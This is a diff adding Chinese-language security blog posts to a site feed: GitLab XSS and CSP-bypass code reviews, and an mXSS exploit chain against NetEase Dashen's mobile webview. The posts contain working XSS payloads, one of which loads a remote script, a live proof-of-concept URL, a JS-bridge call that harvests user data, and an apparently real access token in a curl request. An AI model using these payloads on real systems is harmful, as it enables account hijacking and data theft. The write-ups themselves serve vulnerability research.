+--data '{"repo_id":721517979,"personal_access_token":"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","new_name":"final7","target_namespace":"root","github_hostname":"http://8.134.66.236"}'
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h4 id="tips">Tips</h4>
+
+<ol>
+  <li>该漏洞输入后端渲染漏洞，本来后端渲染数据是通过默认的 haml 模板用=进行渲染，这时会自动完成对数据的 escape，但是这里的漏洞采用了函数调用返回 html 字符串的形式，并且字符串在函数中标注了<code class="language-plaintext highlighter-rouge">HTML.chomp.html_safe</code>。
+<em>app/views/shared/_label_row.html.haml</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.label-name.gl-flex-shrink-0.gl-mt-2.gl-mr-3
+  = render_label(label, tooltip: false)
+</code></pre></div>    </div>
+    <p><em>gitlab/app/helpers/labels_helper.rb#266</em></p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def render_label_text(name, suffix: '', css_class: nil, bg_color: nil)
+    &lt;&lt;~HTML.chomp.html_safe
+        &lt;span
+        class="#{css_class}"
+        data-container="body"
+        data-html="true"
+        #{"style=\"background-color: #{bg_color}\"" if bg_color}
+        &gt;#{ERB::Util.html_escape_once(name)}#{suffix}&lt;/span&gt;
+    HTML
+end
+</code></pre></div>    </div>
+    <p>果然后端是 html_safe 引发的问题。这样，变量中的 xss 代码就能够被嵌入了。</p>
+  </li>
+  <li>csp 绕过利用了前端 jquery 的漏洞，主要 gitlab 前端会扫描后端返回的 html 并且对某些标签进行 jquery 化的处理，很多漏洞都来源于这种机制。要绕过严格的 csp 不是简单的事情，但是 jquery 配合<code class="language-plaintext highlighter-rouge">&lt;script&gt;&lt;/script&gt;</code>html 注入，就可能够绕过 self 这样严格的限制。简直是最大的 bug，到 2023 年 11 月都没有修复。</li>
+</ol>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Replication: Gitlab CSP-bypass XSS in project settings page</title><link href="http://localhost:4000/xss/2023/11/01/csp-bypass-xss-project-setting.html" rel="alternate" type="text/html" title="Replication: Gitlab CSP-bypass XSS in project settings page" /><published>2023-11-01T10:31:06+08:00</published><updated>2023-11-01T10:31:06+08:00</updated><id>http://localhost:4000/xss/2023/11/01/csp-bypass-xss-project-setting</id><content type="html" xml:base="http://localhost:4000/xss/2023/11/01/csp-bypass-xss-project-setting.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Gitlab CSP-bypass XSS in project settings page</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>XSS</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>高危</p>
+</blockquote>
+
+<h2 id="environment">Environment</h2>
+
+<blockquote>
+  <p>gitlab版本：14.5.2-ee</p>
+</blockquote>
+
+<blockquote>
+  <p>原文：<a href="https://hackerone.com/reports/1588732">https://hackerone.com/reports/1588732</a></p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+
+<h2 id="summary">Summary</h2>
+
+<p>gitlab前端jquery js渲染漏洞，js未对用户输入进行校验，而直接利用<code class="language-plaintext highlighter-rouge">${}</code>构造html，嵌入网页后触发xss</p>
+
+<h4 id="code-review">Code Review</h4>
+
+<h5 id="前端渲染部分">前端渲染部分</h5>
+
+<ol>
+  <li>
+    <p><em>gitlab/app/assets/javascripts/projects/settings/access_dropdown.js#534</em></p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> deployKeyRowHtml(key, isActive) {
+     const isActiveClass = isActive || '';
+     return `
+       &lt;li&gt;
+         &lt;a href="#" class="${isActiveClass}"&gt;
+           &lt;strong&gt;${key.title}&lt;/strong&gt;
+           &lt;p&gt;
+             ${sprintf(
+               __('Owned by %{image_tag}'),
+               {
+                 image_tag: `&lt;img src="${key.avatar_url}" class="avatar avatar-inline s26" width="30"&gt;`,
+               },
+               false,
+             )}
+             &lt;strong class="dropdown-menu-user-full-name gl-display-inline"&gt;${escape(
+               key.fullname,
+             )}&lt;/strong&gt;
+             &lt;span class="dropdown-menu-user-username gl-display-inline"&gt;${key.username}&lt;/span&gt;
+           &lt;/p&gt;
+         &lt;/a&gt;
+       &lt;/li&gt;
+     `;
+   }
+</code></pre></div>    </div>
+    <p>其中<code class="language-plaintext highlighter-rouge">key.title</code>没有过滤直接添加到html中。</p>
+  </li>
+  <li>
+    <p>该函数被<em>gitlab/app/assets/javascripts/projects/settings/access_dropdown.js#29</em>行调用，进而定位到<em>gitlab/app/assets/javascripts/deprecated_jquery_dropdown/gl_dropdown.js#396</em>。</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> renderMenu(html) {
+     if (this.options.renderMenu) {
+       return this.options.renderMenu(html);
+     }
+     return $('&lt;ul&gt;').append(html);
+   }
+</code></pre></div>    </div>
+    <p>最终通过jquery进行直接渲染，从用户输入注入到html字符串中，到最终的渲染jquery的append函数，构成了完整的xss攻击。</p>
+  </li>
+</ol>
+
+<h5 id="后端存储部分">后端存储部分</h5>
+
+<ol>
+  <li>首先接受表单的输入，并且发送给后台，表单的创建通过rails默认的<code class="language-plaintext highlighter-rouge">form_for</code>完成，路径为：gitlab/app/views/admin/deploy_keys/new.html.haml</li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">form_for</code>的默认action为：如果实例未创建，那么默认为post方法创建实例；如果以创建，那么默认为更新post方法。注意到form_for没有对用户输入进行过滤。</p>
+
+    <p><img src="/assets/gitlab/1/formfor.png" alt="formfor" /></p>
+  </li>
+  <li>那么对于接受用户输入的前端，可以直接搜索form_for方法来进行定位.</li>
+  <li>对于后端接受post请求创建新实例的文件为：<em>gitlab/app/controllers/admin/deploy_keys_controller.rb</em>，对应到create方法，该方法调用了另一个create：<em>gitlab/app/services/deploy_keys/create_service.rb</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> module DeployKeys
+     class CreateService &lt; Keys::BaseService
+     def execute(project: nil)
+         DeployKey.create(params.merge(user: user))
+     end
+     end
+ end
+</code></pre></div>    </div>
+  </li>
+  <li>Module DeployKey的create方法为内置方法，用于创建一个新的实例，可以看到该处也没有进行用户输入过滤。本来模型在变量定义时就会规定筛选动作，特别是对于应该合法的变量，但是本例中的变量title不应该被筛选，而类似上例中的color属性只能局限为某些颜色，为了防止用户输入随机值，所以采用了筛选机制，筛选机制是匹配失败则后端返回报错。</li>
+  <li>至此，从用户输入到存入后端数据库这一过程都没有进行输入过滤。接下来看一下拉取该输入到前端过程是否有过滤。</li>
+</ol>
+
+<h5 id="前端拉取数据部分">前端拉取数据部分</h5>
+
+<ol>
+  <li>定位到gl_dropdown.js负责对该下拉列表进行处理，逻辑是：前端对某些下拉菜单类进行jquery定位，然后对其进行拦截，注册监听click方法和相关的js动作，例如显示下拉菜单和网络请求</li>
+  <li>Gl_dropdown.js负责在用户点击下拉菜单时，请求后台数据，并且将返回的数据进行渲染。渲染的过程在本节的最开始已经分析。这里分析请求数据到渲染这一过程：
+ a. 首先gl_dropdown.js执行opened(e)函数，然后执行this.remote.execute();获取后台数据</li>
+  <li>首先，请求数据的url不在DeployKey controller中，而是在另一个controller类中，该方法直接返回DeployKey模型的数据，在后端没有进行过滤，以json结构返回。</li>
+  <li>返回后，通过this.options.success方法对json数据进行渲染，并且请求体获取后没有对json对象的字段进行过滤。</li>
+  <li>至此，分析结束。不懂的是下来菜单如何挂载到后端渲染的网页上的，这是在前端的js脚本进行挂载的。</li>
+  <li>原始的显示部分对于keytitle是有过滤的，这一部分是后端渲染，默认使用haml的=会对之后的字符串进行escape，所以这里的后端渲染是安全的。</li>
+</ol>
+
+<h5 id="基于函数流分析">基于函数流分析</h5>
+
+<p>开始基于函数流和基于数据流的分析，基于数据流分析是因为函数流分析是模糊分析，数据流则更为细致。</p>
+
+<ol>
+  <li>函数parseData调用renderData，经由renderMenu，最终实现UI渲染：
+ <em>gitlab/app/assets/javascripts/deprecated_jquery_dropdown/gl_dropdown.js#238</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> parseData(data) {
+     let groupData;
+     let html;
+     this.renderedData = data;
+     if (this.options.filterable &amp;&amp; data.length === 0) {
+         // render no matching results
+         html = [this.noResults()];
+     }
+     // Handle array groups
+     else if (isObject(data)) {
+         this.renderData(groupData, name).map((item) =&gt; html.push(item));
+     });
+     } else {
+         // Render each row
+         html = this.renderData(data);
+     }
+     // Render the full menu
+     const fullHtml = this.renderMenu(html);
+     return this.appendMenu(fullHtml);
+ }
+</code></pre></div>    </div>
+    <p><em>gitlab/app/assets/javascripts/deprecated_jquery_dropdown/gl_dropdown.js#396</em></p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> renderMenu(html) {
+     if (this.options.renderMenu) {
+       return this.options.renderMenu(html);
+     }
+     return $('&lt;ul&gt;').append(html);
+   }
+</code></pre></div>    </div>
+  </li>
+  <li>函数renderData负责传入数据进行渲染：
+ <em>gitlab/app/assets/javascripts/deprecated_jquery_dropdown/gl_dropdown.js#272</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> renderData(data, group) {
+     return data.map((obj, index) =&gt; this.renderItem(obj, group || false, index));
+   }
+</code></pre></div>    </div>
+  </li>
+  <li>回到gl_dropdown.js文件，可以看到引用了render.js的默认item函数，并且将options传递，注意options包含renderRow函数的句柄：
+<em>gitlab/app/assets/javascripts/deprecated_jquery_dropdown/gl_dropdown.js#428</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> import renderItem from './render';
+   renderItem(data, group, index) {
+     return renderItem({
+       instance: this,
+       options: {
+         ...this.options,
+         icon: this.icon,
+       },
+       data,
+     });
+   }
+</code></pre></div>    </div>
+  </li>
+  <li>在deprecated_jquery_dropdown文件夹中搜索renderRow关键字，定位到render.js文件调用了该函数，最终由默认函数item调用了renderRow函数：<em>gitlab/app/assets/javascripts/deprecated_jquery_dropdown/render.js#150</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> function getOptionRenderer({ options, instance }) {
+   return options.renderRow &amp;&amp; ((li, data) =&gt; options.renderRow(data, instance));
+ }
+ function getRenderer(data, params) {
+   return renderersByType[data.type] || getOptionRenderer(params) || renderLink;
+ }
+ export default function item({ data, ...params }) {
+   const renderer = getRenderer(data, params);
+   const li = document.createElement('li');
+   if (shouldHide(data, params)) {
+     hideElement(li);
+   }
+   return renderer(li, data, params);
+ }
+</code></pre></div>    </div>
+  </li>
+  <li>定位到initDeprecatedJQueryDropdown函数所在的文件，可以看到类被绑定到$dropdown元素中
+ <em>gitlab/app/assets/javascripts/deprecated_jquery_dropdown/index.js#8</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> export default function initDeprecatedJQueryDropdown($el, opts) {
+   // eslint-disable-next-line func-names
+   return $el.each(function () {
+     if (!$.data(this, 'deprecatedJQueryDropdown')) {
+       $.data(this, 'deprecatedJQueryDropdown', new GitLabDropdown(this, opts));
+     }
+   });
+ }
+</code></pre></div>    </div>
+  </li>
+  <li>函数initDropdown中的函数initDeprecatedJQueryDropdown获取了renderRow函数的地址，当作句柄。
+ <em>gitlab/app/assets/javascripts/projects/settings/access_dropdown.js#31</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> initDropdown() {
+     const { onSelect, onHide } = this.options;
+     initDeprecatedJQueryDropdown(this.$dropdown, {
+       data: this.getData.bind(this),
+       selectable: true,
+       filterable: true,
+       filterRemote: true,
+       multiSelect: this.$dropdown.hasClass('js-multiselect'),
+       renderRow: this.renderRow.bind(this),
+       toggleLabel: this.toggleLabel.bind(this),
+       hidden() {
+         if (onHide) {
+           onHide();
+         }
+       },
+</code></pre></div>    </div>
+  </li>
+  <li>函数renderRow引用了deployKeyRowHtml函数：
+ <em>gitlab/app/assets/javascripts/projects/settings/access_dropdown.js#507</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> renderRow(item) {
+     let criteria = {};
+     let groupRowEl;
+     switch (item.type) {
+       case LEVEL_TYPES.DEPLOY_KEY:
+         groupRowEl =
+           this.accessLevel === ACCESS_LEVELS.PUSH ? this.deployKeyRowHtml(item, isActive) : '';
+         break;
+     }
+     return groupRowEl;
+   }
+</code></pre></div>    </div>
+  </li>
+  <li>用regex定位到缺陷函数，key.title没有过滤，直接嵌入html中，从这里开始沿着执行流向下分析（往上），从而定位该html如何渲染到html页面
+ <em>gitlab/app/assets/javascripts/projects/settings/access_dropdown.js#534</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> deployKeyRowHtml(key, isActive) {
+     return `
+       &lt;li&gt;
+         &lt;a href="#" class="${isActiveClass}"&gt;
+           &lt;strong&gt;${key.title}&lt;/strong&gt;
+         &lt;/a&gt;
+       &lt;/li&gt;
+     `;
+   }
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>从这里开始沿着执行流向上分析（往下），为了确定该片段会在网站的哪个页面和组件出现。 从上面分析可以看到 this.$dropdown被传进了gl_dropdown并且最终渲染了漏洞代码，因此从$dropdown出发，看看它在哪里被赋值：类AccessDropdown的构造函数中options解构获取了$dropdown标签，那么就需要查询该类在何处实例化，只能够全局搜索？搜索该文件名access_dropdown，（注意导入js文件时可以不带js后缀名）查看其导入位置，有两处。
+ <img src="/assets/gitlab/1/access_dropdown.png" alt="access_dropdown" /></p>
+
+    <p>分别是
+ <em>gitlab/app/assets/javascripts/protected_branches/protected_branch_create.js</em>
+ <em>gitlab/app/assets/javascripts/protected_branches/protected_branch_edit.js</em>
+ 首先分析第一个情况，可以看到$dropdown被赋值:
+ <em>gitlab/app/assets/javascripts/protected_branches/protected_branch_create.js#71</em></p>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> buildDropdowns() {
+     // Allowed to merge dropdown
+     this[`${ACCESS_LEVELS.MERGE}_dropdown`] = new AccessDropdown({
+       accessLevel: ACCESS_LEVELS.MERGE,
+       accessLevelsData: gon.merge_access_levels,
+       $dropdown: this.$allowedToMergeDropdown,
+       onSelect: this.onSelectOption.bind(this),
+       onHide: this.onDropdownHide.bind(this),
+       hasLicense: this.hasLicense,
+     });
+     // Allowed to push dropdown
+     this[`${ACCESS_LEVELS.PUSH}_dropdown`] = new AccessDropdown({
+       accessLevel: ACCESS_LEVELS.PUSH,
+       accessLevelsData: gon.push_access_levels,
+       $dropdown: this.$allowedToPushDropdown,
+       onSelect: this.onSelectOption.bind(this),
+       onHide: this.onDropdownHide.bind(this),
+       hasLicense: this.hasLicense,
+     });
+   }
+</code></pre></div>    </div>
+  </li>
+  <li>继续分析该文件，可以看到$dropdown被初始化位置，也就是说.js-allowed-to-merge和.js-allowed-to-push就是被挂载的类：
+<em>gitlab/app/assets/javascripts/protected_branches/protected_branch_create.js#15</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>constructor(options) {
+    this.hasLicense = options.hasLicense;
+    this.$wraps = {};
+    this.hasChanges = false;
+    this.$wrap = options.$wrap;
+    this.$allowedToMergeDropdown = this.$wrap.find('.js-allowed-to-merge');
+    this.$allowedToPushDropdown = this.$wrap.find('.js-allowed-to-push');
+    this.$forcePushToggle = this.$wrap.find('.js-force-push-toggle');
+    this.$codeOwnerToggle = this.$wrap.find('.js-code-owner-toggle');
+    this.$wraps[ACCESS_LEVELS.MERGE] = this.$allowedToMergeDropdown.closest(
+      `.${ACCESS_LEVELS.MERGE}-container`,
+    );
+    this.$wraps[ACCESS_LEVELS.PUSH] = this.$allowedToPushDropdown.closest(
+      `.${ACCESS_LEVELS.PUSH}-container`,
+    );
+    this.buildDropdowns();
+    this.bindEvents();
+  }
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>到此，被挂载的标签类已经确定，注意到rails一般是后端返回静态页面，而vue/js对静态页面的元素进行热更新，所以需要搜索rails的模板文件：
+<img src="/assets/gitlab/1/js-allowed-to-push.png" alt="js-allowed-to-push" /></p>
+
+    <p>可以看到，有两个rails模板文件包含该class名，分别是：
+<em>gitlab/app/views/projects/protected_branches/_create_protected_branch.html.haml</em>
+<em>gitlab/app/views/shared/projects/protected_branches/_update_protected_branch.html.haml</em>
+先考虑第一种情况：
+找对应的controller：projects/protected_branches_controller.rb 调用该视图，说明该视图很可能是被其他controller调用：</p>
+
+    <p><img src="/assets/gitlab/1/protected_branches_controller.png" alt="protected_branches_controller" /></p>
+
+    <p>分析视图名称，其中show是直接渲染的文件，而_index是局部渲染文件，用于被其他渲染文件调用，而show文件没有调用_index文件，_index文件调用了_create_protected_branch.html.haml，因此对该_index的调用进行分析。搜索: protected_branches/index，可以看到一处调用：<em>gitlab/app/views/projects/settings/repository/_protected_branches.html.haml</em></p>
+
+    <p><img src="/assets/gitlab/1/protected_branches1.png" alt="protected_branches1" /></p>
+
+    <p><img src="/assets/gitlab/1/protected_branches2.png" alt="protected_branches2" /></p>
+  </li>
+  <li>而projects/settings/repository_controller.rb调用了该show，自此，ui定位基本完成，只要访问projects/settings/repository路由即可。
+<em>gitlab/app/controllers/projects/settings/repository_controller.rb#63</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def render_show
+    define_variables
+    render 'show'
+end
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h5 id="基于数据流分析">基于数据流分析</h5>
+<ol>
+  <li>这一过程对什么数据会传输、存储和渲染进行分析，还是从初始点access_dropdown开始分析。
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> deployKeyRowHtml(key, isActive) {
+     return `
+     &lt;li&gt;
+         &lt;a href="#" class="${isActiveClass}"&gt;
+         &lt;strong&gt;${key.title}&lt;/strong&gt;
+         &lt;/a&gt;
+     &lt;/li&gt;
+     `;
+ }
+</code></pre></div>    </div>
+  </li>
+  <li>经过分析得到，该数据最终来自
+ <em>gitlab/app/assets/javascripts/projects/settings/api/access_dropdown_api.js#35</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> const DEPLOY_KEYS_PATH = '/-/autocomplete/deploy_keys_with_owners.json';
+ export const getDeployKeys = (query) =&gt; {
+ return axios.get(buildUrl(gon.relative_url_root || '', DEPLOY_KEYS_PATH), {
+     params: {
+     search: query,
+     per_page: 20,
+     active: true,
+     project_id: gon.current_project_id,
+     push_code: true,
+     },
+ });
+ };
+</code></pre></div>    </div>
+  </li>
+  <li>获取后端的路由，找到对应后端，直接从数据库Deploykey中取出，并返回：
+ <em>gitlab/app/controllers/autocomplete_controller.rb#55</em>
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   def deploy_keys_with_owners
+     deploy_keys = DeployKey.with_write_access_for_project(project)
+     render json: DeployKeySerializer.new.represent(deploy_keys, { with_owner: true, user: current_user })
+   end
+</code></pre></div>    </div>
+    <p>也就是说，漏洞UI渲染的是deploy_key数据，分析完毕。</p>
+  </li>
+</ol>
+
+<h4 id="tips">Tips</h4>
+
+<ul>
+  <li>
+    <p><strong>前端到后端</strong></p>
+
+    <p>一般前端负责对用户输入进行过滤，但是如果采用ruby的form_for方法渲染的静态页面，其中的action是固定的，而且也没有过滤操作。极其容易造成前端的数据没有过滤就给后端了。</p>
+  </li>
+  <li>
+    <p><strong>后端到前端</strong></p>
+
+    <p>数据是通过ruby的erb或者haml模型静态渲染，那么多半进行了过滤，因为这两个种模板默认对数据进行过滤。但是如果数据不是静态挂载，而是通过前端js获取，那么后端极有可能不会首先过滤，并且如果前端没有过滤，则xss出现。因此该xss出现在下拉菜单中就好说了，因为下拉菜单的数据往往是动态获取的，后端来静态渲染它们需要刷新页面。例如在同一个页面更新了数据，传入了后台。当显示的时候，我不可能刷新整个页面去显示那个数据，这时就需要通过api去拉取数据。</p>
+  </li>
+  <li>
+    <p><strong>后端的过滤</strong></p>
+
+    <p>后端的controller方法中，如果creat_params方法没有对数据进行过滤，那么后端很可能不会过滤。</p>
+  </li>
+</ul>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">高危：网易大神手机客户端Webview mxss漏洞</title><link href="http://localhost:4000/xss/jsinterface/2023/10/20/xss-dompurify.html" rel="alternate" type="text/html" title="高危：网易大神手机客户端Webview mxss漏洞" /><published>2023-10-20T10:26:18+08:00</published><updated>2023-10-20T10:26:18+08:00</updated><id>http://localhost:4000/xss/jsinterface/2023/10/20/xss-dompurify</id><content type="html" xml:base="http://localhost:4000/xss/jsinterface/2023/10/20/xss-dompurify.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>网易大神手机客户端存在Webview mxss漏洞，串连不安全的JS interface接口，实现用户敏感信息搜集、账户劫持(请求token泄露)和手机文件上传。这个js interface是注入的，每个打开的网站都能够访问到，但是只有163.com域名能合法调用。因此在163.com域名下找到xss就行。</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+<blockquote>
+  <p>存储型XSS，文件上传，敏感信息收集</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+<blockquote>
+  <p>高危</p>
+</blockquote>
+
+<h2 id="url">URL</h2>
+
+<ul>
+  <li>POC网页 https://m.ds.163.com/square/63ea17eec8dc9d00019266fe/?type=%E6%9C%80%E6%96%B0%E8%AE%A8%E8%AE%BA 使用chrome手机模式查看，打开后在终端自动打印mxss by 0x5r33!!!</li>
+  <li>视频链接：链接：https://pan.baidu.com/s/1ujV4aKjagPCMNhhxELePgg 提取码：1314</li>
+</ul>
+
+<h2 id="key-payload">Key Payload</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload: &lt;math&gt;&lt;mtext&gt;&lt;option&gt;&lt;FAKEFAKE&gt;&lt;option&gt;&lt;/option&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;textarea&gt;&lt;a title="&lt;/textarea&gt;&lt;svg onload=alert(document.domain)&gt;"&gt;
+
+payload2：&lt;math&gt;&lt;mtext&gt;&lt;option&gt;&lt;FAKEFAKE&gt;&lt;option&gt;&lt;/option&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;textarea&gt;&lt;a title="&lt;/textarea&gt;&lt;svg onload=eval(atob('Y29uc29sZS5sb2coJ214c3MgYnkgMHg1cjMzISEhJyk7dmFyIHNjcmlwdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtzY3JpcHQuc3JjPSdodHRwczovL3VyY2hpbi5ub3Nkbi4xMjcubmV0L3lzJTJGMDcwYjA4MjUyZGIzNDhhMmJlMjU0NDI3MjIzYzEzMTknO2RvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF0uYXBwZW5kQ2hpbGQoc2NyaXB0KTs='))&gt;"&gt;
+
+POC: https://m.ds.163.com/square/63ea17eec8dc9d00019266fe/?type=%E6%9C%80%E6%96%B0%E8%AE%A8%E8%AE%BA 使用chrome手机模式查看，打开后在终端自动打印mxss by 0x5r33!!!
+</code></pre></div></div>
+
+<h2 id="summary">Summary</h2>
+<p>网易大神客户端中，没有对用户发帖进行过滤，全靠手机版网页前端进行过滤，由于手机版网页前端使用了不安全的dompurify组件，该组件受到mXSS（突变型XSS）攻击，导致攻击者能够绕过该组件的过滤，从而在网页上嵌入XSS代码。而该手机版网页通过大神内置的webview进行访问后，xss能够获取客户端暴露的webview javascript interface接口。而该类接口暴露了用户敏感信息例如手机号、请求token、粘贴板数据，更为严重的是暴露了客户端的文件读取接口，攻击者能够读取用户手机指定文件，包括外置存储卡文件和网易大神的私有文件，照成更严重的信息泄漏，不外乎大神应用的数据库、sharedprefs等，造成潜在的账户劫持。</p>
+
+<h3 id="detail">Detail</h3>
+<p>请按照逻辑对漏洞复现进行描述，提供危害说明和测试步骤。若使用工具复现漏洞，应提供工具详情</p>
+<h4 id="trigger">Trigger</h4>
+<ol>
+  <li>
+    <p>进入大神网页版https://ds.163.com/，然后用chrome模拟手机端，刷新后，网页自动跳转到手机端网址：https://m.ds.163.com/</p>
+
+    <p><img src="/assets/images/home.png" alt="home" /></p>
+
+    <p>选择一个游戏栏目，为了测试选一个冷门游戏”岐风之旅”，因为发帖较少，发的贴子都能置顶。</p>
+
+    <p><img src="/assets/images/qifeng.png" alt="qifeng" /></p>
+  </li>
+  <li>
+    <p>打开最新版网易大神客户端，注册并登录账号。登录后切换到主页，选择游戏圈子”岐风之旅”，并且进行发帖测试。</p>
+
+    <p>登录</p>
+
+    <p><img src="/assets/images/login.png" alt="login" /></p>
+
+    <p>切换到主页，选择游戏圈子”岐风之旅”栏目</p>
+
+    <p><img src="/assets/images/switch.png" alt="switch" />
+ <img src="/assets/images/switch2.png" alt="switch2" /></p>
+
+    <p>发帖测试</p>
+
+    <p><img src="/assets/images/post1.png" alt="post1" />
+ <img src="/assets/images/post2.png" alt="post2" /></p>
+
+    <p>尝试发送html标签，输入 <b>hello</b></p>
+
+    <p><img src="/assets/images/sendpost.png" alt="sendpost" /></p>
+  </li>
+  <li>
+    <p>打开第一步中的手机端网页,chrome用切换到手机模式 https://m.ds.163.com/square/63ea17eec8dc9d00019266fe/?type=%E6%9C%80%E6%96%B0%E8%AE%A8%E8%AE%BA 发现 hello 被加粗了，说明该网页能嵌入html代码。</p>
+
+    <p><img src="/assets/images/hellotest.png" alt="hellotest" /></p>
+  </li>
+  <li>
+    <p>开始debug，通过chrome插件Untrusted types(domXss调试利器)可以定位到我们的输入<b>hello</b>被直接赋值给了innerHTML。并且通过调用堆栈，笔者定位到前端在某阶段对用户输入进行了过滤，过滤组件采用的是大名鼎鼎的DomPurify，版本为2.0.12。</p>
+
+    <p><img src="/assets/images/untrusted.png" alt="untrusted" /></p>
+
+    <p>dompurify的过滤，代码位置：https://g.166.net/res/a19/86e9c93c4b0297736ba7.js text = E.sanitize(text, {FORBID_TAGS: [“style”]})</p>
+
+    <p><img src="/assets/images/sanitize.png" alt="sanitize" /></p>
+
+    <p>查看dompurify的版本为：2.0.12</p>
+
+    <p><img src="/assets/images/dompurifyversion.png" alt="dompurifyversion" /></p>
+  </li>
+  <li>
+    <p>查询得知该dompurify版本存在mXSS攻击，mXSS攻击的原理是利用math标签将html标签放置在math协议的作用域下，在html和math作用域之间切换出现不一致，导致出错。具体原理请参考以下两篇文章：</p>
+
+    <p>mxss原理解析：
+ https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/</p>
+
+    <p>mxss的利用：
+ https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers/#how-to-find-swagger-ui-at-scale</p>
+  </li>
+  <li>
+    <p>通过上面的第二篇参考文章，笔者很快构造好了xss payload，如下。进行发帖测试后，刷新手机版网页，弹出成功出现。</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> &lt;math&gt;&lt;mtext&gt;&lt;option&gt;&lt;FAKEFAKE&gt;&lt;option&gt;&lt;/option&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;textarea&gt;&lt;a title="&lt;/textarea&gt;&lt;svg onload=alert(document.domain)&gt;"&gt;
+</code></pre></div>    </div>
+
+    <p>将该payload通过前述步骤发帖：</p>
+
+    <p><img src="/assets/images/mxss.png" alt="mxss" /></p>
+
+    <p>下断点调试看到，执行完sanitize函数后，结果依然包含xss payload:</p>
+
+    <p><img src="/assets/images/mxsspayload.png" alt="mxsspayload" /></p>
+
+    <p>弹窗出现：</p>
+
+    <p><img src="/assets/images/mxssalert.png" alt="mxssalert" /></p>
+  </li>
+  <li>
+    <p>客户端webview xss，打开大神客户端，选择任意频道发消息，将该mxss链接发送到群里。受害者点击后，mxss在客户端的webview中执行。</p>
+
+    <p>发送恶意链接：</p>
+
+    <p><img src="/assets/images/mxsslink.png" alt="mxsslink" /></p>
+
+    <p>点击该链接，大神用webview打开，弹框执行：</p>
+
+    <p><img src="/assets/images/webviewxss.png" alt="webviewxss" /></p>
+  </li>
+  <li>
+    <p>使用chrome device调试大神app的webview，这里需要手机root并且安装WebviewPP Edxposed模块，开启应用webview调试。</p>
+
+    <p>usb连接电脑，在chrome上使用chrome://device开启webview调试</p>
+
+    <p><img src="/assets/images/webviewdebug.png" alt="webviewdebug" /></p>
+
+    <p>调试页面</p>
+
+    <p><img src="/assets/images/webviewdebug2.png" alt="webviewdebug2" /></p>
+  </li>
+  <li>
+    <p>可以查看webview暴露的JavaScript interface，WebViewJavascriptBridge模块。并且在”个人中心-绑定cc页面”找到该模块的完整用法。</p>
+
+    <p>WebViewJavascriptBridge模块</p>
+
+    <p><img src="/assets/images/jsinterface.png" alt="jsinterface" /></p>
+
+    <p>从另一个页面找到该模块的完整用法，该webview的js端为：https://g.166.net/opd/ds-js-sdk/0.16.0/ds-js-sdk.min.js</p>
+
+    <p><img src="/assets/images/bindcc.png" alt="bindcc" /></p>
+
+    <p>搜索WebViewJavascriptBridge模块的函数关键字callHandler，定位到该webview js interface的所有用法。</p>
+
+    <p><img src="/assets/images/bindcc2.png" alt="bindcc2" /></p>
+  </li>
+  <li>
+    <p>漏洞利用：暴露用户敏感信息</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>//获取手机客户端用户信息，包括手机号，用户id
+WebViewJavascriptBridge.callHandler("getLogField", {iosVersion: "1.4.0",androidVersion: "1.4.0",upgrade: 0},function(e){console.log(e)})
+</code></pre></div>    </div>
+
+    <p><img src="/assets/images/getuserinfo.png" alt="getuserinfo" /></p>
